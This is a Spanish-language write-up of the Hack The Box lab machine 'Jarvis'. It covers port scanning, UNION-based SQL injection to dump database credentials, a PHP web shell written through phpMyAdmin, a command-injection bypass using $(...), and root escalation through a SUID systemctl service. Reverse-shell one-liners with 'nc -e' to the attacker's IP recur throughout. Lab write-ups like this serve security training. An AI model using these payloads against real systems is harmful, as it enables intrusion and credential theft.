---
layout: single
title: Jarvis - Hack The Box
excerpt: "Jarvis es una buena maquina para practicar SQLi, gracias a ello conseguimos un hash de la contraseña DBadmin para luego acceder al panel phpmyadmin, luego el acceso al sistema es bsatante sencillo, pero hay que convertirse en un usuario para luego escalar privilegios mediante un binario SUID"
date: 2021-08-19
classes: wide
header:
  teaser: /assets/images/Jarvis/logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  -   Web
  -   SQLi
  -   SUID
  -   OSCP
---

<div>
<p style = 'text-align:center;'>
<img src="https://sckull.github.io/images/posts/htb/jarvis/cover.webp" alt="" width="600px">
</p>
</div>

<div>
<p style = 'text-align:center;'>
<img src="https://0xdf.gitlab.io/img/jarvis-radar.png" alt="" width="250px">
</p>
</div>

# Jarvis

# **ENUMERACION**

Realizamos un escaneo de los puertos abiertos

```bash
❯ nmap -sC -sV -p22,80,64999 10.10.10.143 -oN scanPorts
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 03:19 EDT
Nmap scan report for 10.10.10.143
Host is up (0.14s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Dos de ellos son paginas webs

```bash
❯ whatweb http://10.10.10.143 > whatweb80
                                                                                                                                                                                                                                           
❯ cat whatweb80
http://10.10.10.143 [200 OK] Apache[2.4.25], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[supersecurehotel@logger.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.143], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[Stark Hotel], UncommonHeaders[ironwaf], X-UA-Compatible[IE=edge]
```

```bash
❯ whatweb http://10.10.10.143:64999 > whatweb64999
                                                                                                                                                                                                                                           
❯ cat whatweb64999
http://10.10.10.143:64999 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.143], UncommonHeaders[ironwaf]
```

En la pagina encontramos el nombre del dominio, lo agregamos al /etc/hosts

<center>

![Untitled](/assets/images/Jarvis/Untitled.png)

</center>

```bash
❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

10.10.10.143    logger.htb supersecurehotel.htb
```

Investigando por la pagina entramos un archivo php al cual si le pasamos el parametro cod nos devuelve informacion, este tipo de codigo es propenso a ser vulnerable si no esta bien sanitizado, vamos a intentar realizar una SQLi:

<center>

![Untitled](/assets/images/Jarvis/Untitled%201.png)

</center>

# **EXPLOTACION**

## ¿Qué es SQLi?

Inyección SQL es un método de infiltración de código intruso que se vale de una vulnerabilidad informática presente en una aplicación en el nivel de validación de las entradas para realizar operaciones sobre una base de datos.

Tiene una blacklist de algunos parametros que bloquea la IP durante 90 segundos, vamos  a intentar realizarla de otra forma:

<center>

![Untitled](/assets/images/Jarvis/Untitled%202.png)

</center>

Trato de hacer manualmente una inyección sql para ver cuantas columnas tiene la base de datos:

`http://10.10.10.143/room.php?cod=7 UNION SELECT 1,2--+`

Encontramos el numero de columnas:

`http://10.10.10.143/room.php?cod=7 UNION SELECT 1,2,3,4,5,6,7--+`

<center>

![Untitled](/assets/images/Jarvis/Untitled%203.png)

</center>

Podemos enumerar la base de datos:

<center>

![Untitled](/assets/images/Jarvis/Untitled%204.png)

</center>

Lo primero a enumerar es el nombre de las base de datos y cuantas existen:

`http://10.10.10.143/room.php?cod=7 UNION SELECT 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c)e,4,5,6,7+fRoM+information_schema.schemata--+`

<center>

![Untitled](/assets/images/Jarvis/Untitled%205.png)

</center>

Hay 4 base de datos, vamos a enumerar hotel y mysql:

```bash
❯ curl -s -X GET "http://10.10.10.143/room.php?cod=7%20UNION%20SELECT%201,2,gRoUp_cOncaT(0x7c,table_name,0x7c)e,4,5,6,7+fRoM+information_schema.tables++wHeRe+table_schema=%22hotel%22--+" | grep "price-room" | html2text
|room|
```

Solo tiene la tabla room, no me interesa, asi que paso a la base de datos de mysql:

```bash
❯ curl -s -X GET "http://10.10.10.143/room.php?cod=7%20UNION%20SELECT%201,2,gRoUp_cOncaT(0x7c,table_name,0x7c)e,4,5,6,7+fRoM+information_schema.tables++wHeRe+table_schema=%22mysql%22--+" | grep "price-room" | html2text
|column_stats|,|columns_priv|,|db|,|event|,|func|,|general_log|,|gtid_slave_pos|,|help_category|,|help_keyword|,|help_relation|,|help_topic|,|host|,|index_stats|,|innodb_index_stats|,|innodb_table_stats|,|plugin|,|proc|,|procs_priv|,|proxies_priv|,|roles_mapping|,|servers|,|slow_log|,|table_stats|,|tables_priv|,|time_zone|,|time_zone_leap_second|,|time_zone_name|,|time_zone_transition|,|time_zone_transition_type|,|user|
```

Vemos que tiene una tabla llamada user, normalmente mysql tiene dentro de la tabla user las columnas user y password, vamos a intentar sacar la informacion:

```bash
❯ curl -s -X GET "http://10.10.10.143/room.php?cod=7%20UNION%20SELECT%201,2,gRoUp_cOncaT(user,0x7c,password)e,4,5,6,7+fRoM+mysql.user--+" | grep "price-room" | html2text
DBadmin|*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
```

Tiramos de CrackStation para ir mas rapido a la hora de crackear contraseñas:

<center>

![Untitled](/assets/images/Jarvis/Untitled%206.png)

</center>

Tenemos una contraseña, ¿pero de que? voy a enumerar la pagina web con wfuzz para ver si encuentro algún login:

```bash
❯ wfuzz -c -w /opt/diccionario_medio.txt -t 200 -L --hc 404 http://10.10.10.143/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.143/FUZZ
Total requests: 220546
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================
000000002:   200        47 L     359 W      7201 Ch     "images"                                                                                                                                                                  
000000536:   200        26 L     154 W      3043 Ch     "css"                                                                                                                                                                     
000000939:   200        28 L     186 W      3580 Ch     "js"                                                                                                                                                                      
000002757:   200        18 L     82 W       1333 Ch     "fonts"                                                                                                                                                                   
000010811:   200        215 L    728 W      15189 Ch    "phpmyadmin"
```

Hemos accedido al panel de phpmyadmin: `DBadmin:imissyou`

<center>

![Untitled](/assets/images/Jarvis/Untitled%207.png)

</center>

# **GANANDO ACCESO AL SISTEMA**

A partir de aquí la intrusión al sistema es pan comido, os dejo aquí un link donde explica paso a paso como hacerlo: [Link](https://www.eninsoft.com/obtener-una-shell-del-s-o-via-mysql-o-phpmyadmin/)

1º ejecutamos esta sintaxis SQL y le damos a go: 

`SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/RCE.php"`

2º Accedemos a la pagina que acabamos de crear:

http://10.10.10.143/RCE.php

3º A traves de la variable cmd, le decimos que comando queremos ejecutar

```bash
❯ curl -s -X get "http://10.10.10.143/RCE.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ya solo tendriamos que ponernos en escucha por un puerto en nuestra maquina, y ejecutar una reverse shell en la web:

```bash
❯ curl -s -X get "http://10.10.10.143/RCE.php?cmd=nc+-e+/bin/sh+10.10.16.198+443"

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.143] 54394
hostname;whoami
jarvis
www-data
```

# MOVIMIENTO LATERAL

Ya estamos dentro ahora toca enumerar el sistema, no podemos ver la flag asi que tenemos que ganar acceso como el usuario pepper:

```bash
www-data@jarvis:/home/pepper$ ls -la
drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web
-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt
```

Tenemos un privilegio sudo:

```bash
www-data@jarvis:/home/pepper$ sudo -l
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

Podemos ejecutar como pepper sin proporcionar contraseña el script simpler.py, hay que examinar que hace ese script:

```bash
www-data@jarvis:/home/pepper$ sudo -u pepper /var/www/Admin-Utilities/simpler.py
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
```

Nos muestra como podemos usarlo, y una de las opciones es poder hacer un ping:

```bash
www-data@jarvis:/home/pepper$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: 10.10.16.198
PING 10.10.16.198 (10.10.16.198) 56(84) bytes of data.
64 bytes from 10.10.16.198: icmp_seq=1 ttl=63 time=101 ms
64 bytes from 10.10.16.198: icmp_seq=2 ttl=63 time=50.6 ms
^C
www-data@jarvis:/home/pepper$ 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
04:47:10.056312 IP logger.htb > 10.10.16.198: ICMP echo request, id 1539, seq 1, length 64
04:47:10.056361 IP 10.10.16.198 > logger.htb: ICMP echo reply, id 1539, seq 1, length 64
04:47:11.006273 IP logger.htb > 10.10.16.198: ICMP echo request, id 1539, seq 2, length 64
04:47:11.006290 IP 10.10.16.198 > logger.htb: ICMP echo reply, id 1539, seq 2, length 64
```

Vale funciona corractamente, pero y ¿como nos aprovechamos de esto? Pues en bash si podemos poner en el input ``cualquier comando`` al ejecutar el script nos va a ejecutar tambien ese comando, un ejemplo sencillo seria este:

```bash
❯ cat script.sh
#!/bin/bash
echo "hola soy `whoami`"
                                                                                                                                                                                                                                           
❯ ./script.sh
hola soy root
```

En este caso en especial el creador del script ha sido cuidadoso y ha agregado una blacklist con el cual si en el input del usuario existe ['&', ';', '-', '`', '||', '|'] no va a poder ejecutar el ping, pero hay otras formas de ejecutar comandos en bash como por ej $(comando):

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

La forma de burlar esto seria creandonos un script en bash que contenga una reverse shell:

```bash
❯ cat reverse.sh
#!/bin/bash

nc -e /bin/sh 10.10.16.198 443
```

```bash
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: $(bash reverse.sh)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.143] 54402
whoami
pepper
pepper@jarvis:~$ cat user.txt 
2afa36c4f05b37b34259c---------
```

# **ESCALACION DE PRIVILEGIOS**

Nos pasamos el `linpeas` para enumerar el sistema:

```bash
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 31K Aug 21  2018 /bin/fusermount (Unknown SUID binary)
-rwsr-xr-x 1 root root 44K Mar  7  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 60K Nov 10  2016 /bin/ping
-rwsr-x--- 1 root pepper 171K Feb 17  2019 /bin/systemctl
```

Nos reporta que podemos ejecutar como SUID el binario /bin/systemctl , vamos a buscar como aprovecharnos de esto: [Link](https://www.notion.so/78786df7899a840ec43c5ddecb6a4740)

1º Creamos el archivo root.service

```bash
❯ cat root.service
[Unit]
Description=roooooooooot

[Service]
Type=oneshot
User=root
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.16.198 443'

[Install]
WantedBy=multi-user.target
```

2º Nos creamos una nueva carpeta en la raiz de pepper

```bash
pepper@jarvis:~/privesc$ pwd
/home/pepper/privesc
pepper@jarvis:~/privesc$ ls 
root.service
```

3º Ejecutamos los siguientes comandos

```bash
pepper@jarvis:~/privesc$ systemctl link /home/pepper/privesc/root.service 
pepper@jarvis:~/privesc$ systemctl enable --now /home/pepper/privesc/root.service
pepper@jarvis:~/privesc$ systemctl start root
pepper@jarvis:~/privesc$ 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.143] 54418
whoami
root
cat /root/root.txt
d41d8cd98f00b204e9800998------
```